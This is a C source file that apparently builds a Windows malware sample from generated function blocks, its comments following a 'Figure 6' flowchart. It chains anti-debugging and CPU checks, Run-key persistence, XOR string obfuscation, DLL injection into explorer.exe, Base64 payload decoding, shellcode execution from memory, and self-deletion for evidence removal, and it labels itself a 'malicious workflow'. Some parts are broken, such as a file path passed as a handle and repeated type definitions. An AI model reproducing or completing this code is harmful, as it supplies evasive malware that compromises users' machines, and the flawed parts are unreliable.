
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#include <intrin.h>


#include <windows.h>

// Define necessary structures if NTAPI functions are used
// (Not using NTAPI in this implementation as requested)

BOOL Debugger_Identification() {
    BOOL isDebuggerPresent = FALSE;
    BOOL isRemoteDebuggerPresent = FALSE;

    // 1. Check with IsDebuggerPresent()
    if (IsDebuggerPresent()) {
        isDebuggerPresent = TRUE;
    }

    // 2. Check with CheckRemoteDebuggerPresent()
    HANDLE hProcess = GetCurrentProcess();
    if (hProcess != NULL) {
        CheckRemoteDebuggerPresent(hProcess, &isRemoteDebuggerPresent);
        CloseHandle(hProcess);
    }

    return isDebuggerPresent || isRemoteDebuggerPresent;
}

#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS (NTAPI *RtlNtStatusToDosError)(NTSTATUS Status);
typedef NTSTATUS (NTAPI *NtQuerySystemInformation)(
    UINT SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_PROCESSOR_INFORMATION {
    WORD  ProcessorArchitecture;
    WORD  ProcessorLevel;
    WORD  ProcessorRevision;
    BYTE  Reserved;
    DWORD  ProcessorFeatureBits;
    DWORD  Reserved1;
} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemNotImplemented1,
    SystemProcessesAndThreadsInformation,
    SystemCallCounts,
    SystemConfigurationInformation,
    SystemProcessorPerformanceInformation,
    SystemGlobalFlagInformation,
    SystemNotImplemented2,
    SystemModuleInformation,
    SystemLockInformation,
    SystemNotImplemented3,
    SystemCrashDumpInformation,
    SystemExceptionInformation,
    SystemCrashDumpStateInformation,
    SystemQuotaInformation,
    SystemOverloadCounterInformation,
    SystemPplmInformation,
} SYSTEM_INFORMATION_CLASS;


BOOL CPU_Identification() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        return FALSE;
    }

    NtQuerySystemInformation NtQuerySystemInformationFunc = (NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (NtQuerySystemInformationFunc == NULL) {
        return FALSE;
    }

    SYSTEM_PROCESSOR_INFORMATION processorInfo;
    NTSTATUS status = NtQuerySystemInformationFunc(
        SystemProcessorInformation,
        &processorInfo,
        sizeof(SYSTEM_PROCESSOR_INFORMATION),
        NULL
    );

    if (status != 0) {
      return FALSE;
    }
    
    if (processorInfo.ProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        return TRUE;
    } else {
        return FALSE;
    }
}

#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void AutoRun() {
    HKEY hKey;
    LONG result;
    wchar_t exePath[MAX_PATH];
    DWORD pathLength = MAX_PATH;

    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        return; // Failed to get executable path
    }

    result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);

    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, L"MyApplication", 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));

        if (result != ERROR_SUCCESS) {
            // Handle error, e.g., log it
            printf("Failed to set registry value. Error code: %ld\n", result);
        }

        RegCloseKey(hKey);
    } else {
        // Handle error opening key
        printf("Failed to open registry key. Error code: %ld\n", result);
    }
}

#include <windows.h>

void String_XOR(char *string, char *key) {
    int string_len = strlen(string);
    int key_len = strlen(key);

    for (int i = 0; i < string_len; i++) {
        string[i] = string[i] ^ key[i % key_len];
    }
}

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#ifndef _UNICODE
typedef wchar_t WCHAR;
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void DLL_Injection(char *dll, char *process) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID pRemoteBuffer = NULL;
    DWORD processId = 0;
    HMODULE hKernel32 = NULL;
    LPVOID pLoadLibraryW = NULL;

    // Convert process name to wide string for CreateToolhelp32Snapshot
    WCHAR wProcessName[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, process, -1, wProcessName, MAX_PATH);

    // Get process ID by name
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return;
    }

    if (!Process32FirstW(hSnapshot, &pe32)) {
        fprintf(stderr, "Process32FirstW failed: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return;
    }

    do {
        if (wcscmp(pe32.szExeFile, wProcessName) == 0) {
            processId = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    if (processId == 0) {
        fprintf(stderr, "Process not found.\n");
        return;
    }

    // Open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        fprintf(stderr, "OpenProcess failed: %lu\n", GetLastError());
        return;
    }

    // Allocate memory in the remote process
    pRemoteBuffer = VirtualAllocEx(hProcess, NULL, strlen(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteBuffer == NULL) {
        fprintf(stderr, "VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, dll, strlen(dll) + 1, NULL)) {
        fprintf(stderr, "WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Get the address of LoadLibraryW
    hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (hKernel32 == NULL) {
        fprintf(stderr, "GetModuleHandleW failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryW == NULL) {
        fprintf(stderr, "GetProcAddress failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Create a remote thread to call LoadLibraryW with the DLL path
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pRemoteBuffer, 0, NULL);
    if (hThread == NULL) {
        fprintf(stderr, "CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

int
Load_From_File(void *file, void *buffer)
{
    HANDLE hFile = (HANDLE)file;
    DWORD fileSize;
    DWORD bytesRead;

    if (hFile == INVALID_HANDLE_VALUE) {
        return -1; // Indicate an error
    }

    fileSize = GetFileSize(hFile, NULL);

    if (fileSize == INVALID_FILE_SIZE) {
        return -1; // Indicate an error
    }

    if (buffer == NULL) {
        return -1;
    }

    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        return -1; // Indicate an error
    }

    if (bytesRead != fileSize) {
        return -1; // Indicate an error
    }

    return (int)fileSize;
}

#include <windows.h>
#include <wincrypt.h> // Required for CryptStringToBinary

int Decode_Base64(void *encoded, int size, void *decoded) {
    if (encoded == NULL || decoded == NULL || size < 0) {
        // Invalid input parameters
        return 0;
    }

    DWORD decoded_size = 0;

    // First call to CryptStringToBinaryA to determine the required output buffer size.
    // The 'size' parameter is passed as cchString, so the input buffer
    // 'encoded' does not need to be null-terminated.
    if (!CryptStringToBinaryA(
        (LPCSTR)encoded,        // Pointer to the encoded string buffer
        (DWORD)size,            // Length of the encoded string
        CRYPT_STRING_BASE64,    // Flag to specify Base64 decoding
        NULL,                   // Output buffer is NULL to get the required size
        &decoded_size,          // Receives the required size of the output buffer
        NULL,                   // Not used for this operation
        NULL                    // Not used for this operation
    )) {
        // An error occurred (e.g., invalid Base64 string)
        return 0;
    }

    if (decoded_size == 0 && size == 0) {
        // Special case: an empty input string correctly decodes to an empty output.
        // In this specific scenario, decoded_size will be 0, and this is a valid result.
        return 0;
    }
    
    // Second call to CryptStringToBinaryA to perform the actual decoding
    if (!CryptStringToBinaryA(
        (LPCSTR)encoded,        // Pointer to the encoded string buffer
        (DWORD)size,            // Length of the encoded string
        CRYPT_STRING_BASE64,    // Flag to specify Base64 decoding
        (BYTE *)decoded,        // Pointer to the caller-provided output buffer
        &decoded_size,          // Receives the actual size of the decoded data
        NULL,                   // Not used for this operation
        NULL                    // Not used for this operation
    )) {
        // An error occurred during decoding (e.g., buffer too small, or other error)
        // Note: This function assumes the 'decoded' buffer is large enough.
        // The caller is responsible for allocating 'decoded' with at least the size
        // obtained from the first call to CryptStringToBinaryA.
        return 0;
    }

    return (int)decoded_size;
}

#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
    PVOID DefaultLanguage;
    PVOID DefaultUiLanguage;
    PVOID DllCharacteristics;
    PVOID DllCheckSum;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    PVOID OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    BYTE Length;
    BYTE Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BYTE ShutdownInProgress;
    PVOID ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE InheritedAddressSpace;
    BYTE ReadImageFileExecOptions;
    BYTE BeingDebugged;
    BYTE SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    ULONG CrossProcessFlags;
    ULONG UserSharedData;
    ULONG SpareUlong;
    ULONG nNumberOfProcessors;
    LARGE_INTEGER AlignedMask;
    union {
        ULONG MemoryManagementFlags;
        struct {
            ULONG LowFragmentation : 1;
            ULONG HardenedVa : 1;
        };
    };
    ULONG ImageBaseAddressSpaceUsage;
    ULONG ImageBaseAddressSpaceUsageMask;
    ULONG AppCompatInfo;
    ULARGE_INTEGER CSDVersion;
    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDependencies;
    PVOID SxsContextList;
    PVOID ShimData;
    PVOID AppCompatFlags;
    PVOID AppCompatFlagsUser;
    PVOID pShimInfo;
    ULONG AppCompatFlagsProcess;
    ULONG AppVerifierFlags;
    PVOID AppVerifierFlagsUser;
    PVOID pfnAllocateUserPhysicalPages;
    PVOID pfnFreeUserPhysicalPages;
    PVOID pPhysicalVad;
    ULONG pProtectedProcesses;
    PVOID SessionId;
    ULARGE_INTEGER AppCompatCacheFlags;
    ULONG AppCompatFlagsUserReg;
    ULONG SpareUlong2;
    ULARGE_INTEGER TxnIsolationLevel;
    ULONG TxnIsolationFlags;
    ULONG SpareUlong3;
    ULONG SkipPatchingAlso;
    PVOID ShimEngine;
    PVOID MaxVcrRuntime;
    ULONG FilterBitmap;
    ULONG ActivityId;
    PVOID pHeapReplacementFunction;
    DWORD dwHotpatchGeneration;
    PVOID pContextData;
    PVOID pReserved[2];
    PVOID* pInstrumentationCallbackSpares;
    ULONG pInstrumentationFunction;
} PEB, *PPEB;

#ifdef _WIN64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

void Run_From_Memory(void *shellcode, int size) {
  DWORD oldProtect;
  void (*func)();

  VirtualProtect(shellcode, size, PAGE_EXECUTE_READWRITE, &oldProtect);

  func = (void (*)())shellcode;
  func();
}

#include <windows.h>
#include <stdio.h>

void Delete_File(char *filename) {
    if (DeleteFileA(filename) == 0) {
        DWORD error = GetLastError();
        fprintf(stderr, "Error deleting file: %s, Error code: %lu\n", filename, error);
    } else {
        printf("File deleted successfully: %s\n", filename);
    }
}

#include <windows.h>
#include <stdio.h>

#ifndef UNICODE
typedef unsigned short WCHAR;
#define UNICODE
#endif

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void Delete_Itself() {
    WCHAR filename[MAX_PATH + 1];
    if (GetModuleFileNameW(NULL, filename, MAX_PATH) == 0) {
        return;
    }

    WCHAR cmd[MAX_PATH * 2 + 50];
    swprintf(cmd, sizeof(cmd) / sizeof(WCHAR), L"cmd /c del /f /q \"%s\" > nul 2>&1 & del /f /q \"%s\"", filename, filename);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    ExitProcess(0);
}


#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function Prototypes (must match generated blocks)
BOOL Debugger_Identification();
BOOL CPU_Identification();
void AutoRun();
void String_XOR(char *string, char *key);
void DLL_Injection(char *dll, char *process);
int Load_From_File(void *file, void *buffer);
int Decode_Base64(void *encoded, int size, void *decoded);
void Run_From_Memory(void *shellcode, int size);
void Delete_File(char *filename);
void Delete_Itself();


int main() {
    // --- 1. Defense Evasion Checks ---
    
    // Check 1: Debugger Identification (Figure 6: Start -> Debugger Identification)
    printf("[*] Running Debugger Check...\n");
    if (Debugger_Identification()) {
        printf("[!] Debugger detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Debugger NOT detected. Continuing.\n");

    // Check 2: CPU Identification (Figure 6: Debugger Identification -> CPUID Check)
    printf("[*] Running CPU Identification Check (Intel target)...\n");
    if (!CPU_Identification()) {
        printf("[!] Target CPU NOT detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Target CPU detected. Continuing execution.\n");


    // --- 2. Core Malicious Actions ---
    
    // Action 1: Persistence (Figure 6: CPUID Check -> Set AutoRun)
    printf("[*] Setting Persistence (AutoRun)...\n");
    AutoRun();

    // Setup: XOR strings and buffers (for simplicity, we use hardcoded paths/names)
    char dll_name[] = "KERNEL32.DLL"; 
    char dll_key[] = "abc";
    char process_name[] = "explorer.exe";

    // Action 2: String XOR (Figure 6: Set AutoRun -> XOR String)
    printf("[*] XOR-ing DLL name string...\n");
    String_XOR(dll_name, dll_key);
    
    // Action 3: DLL Injection (Figure 6: XOR String -> Inject DLL)
    // NOTE: We XOR back here so DLL_Injection gets the plaintext name.
    String_XOR(dll_name, dll_key); 
    printf("[*] Injecting DLL into process: %s\n", process_name);
    DLL_Injection(dll_name, process_name);
    String_XOR(dll_name, dll_key); // Re-XOR for stealth

    // Action 4: Load and Decode Payload
    char file_path[] = "C:\\path\\to\\payload.b64";
    char payload_buffer[1024] = {0};
    unsigned char decoded_shellcode[1024] = {0};
    int n_read, n_decoded;

    // Load file (Figure 6: Load File)
    printf("[*] Loading payload from file: %s\n", file_path);
    n_read = Load_From_File(file_path, payload_buffer);
    
    // Decode Base64 (Figure 6: Decode Base64)
    printf("[*] Decoding Base64 payload (Size: %d)...\n", n_read);
    n_decoded = Decode_Base64(payload_buffer, n_read, decoded_shellcode);
    
    // Action 5: Execute Payload (Figure 6: Run Memory)
    if (n_decoded > 0) {
        printf("[*] Running shellcode from memory (Size: %d)...\n", n_decoded);
        Run_From_Memory(decoded_shellcode, n_decoded);
        printf("[+] Shellcode execution initiated.\n");
    } else {
        printf("[!] Payload decoding failed. Exiting.\n");
    }

    // --- 3. Normal Exit ---
    printf("[✔] Malicious workflow complete. Exiting normally.\n");
    return 0;


    // --- 4. Evasion and Exit Routine (Figure 6: Delete File -> Delete Itself -> Exit) ---
    EVASION_ROUTINE:
    
    // Action 6: Delete associated library file
    printf("[*] Deleting associated file: %s\n", dll_name);
    Delete_File(dll_name);
    
    // Action 7: Delete own executable
    printf("[*] Deleting self (Evidence removal)...\n");
    Delete_Itself();

    printf("[!] Evasion complete. Exiting.\n");
    return -1;
}
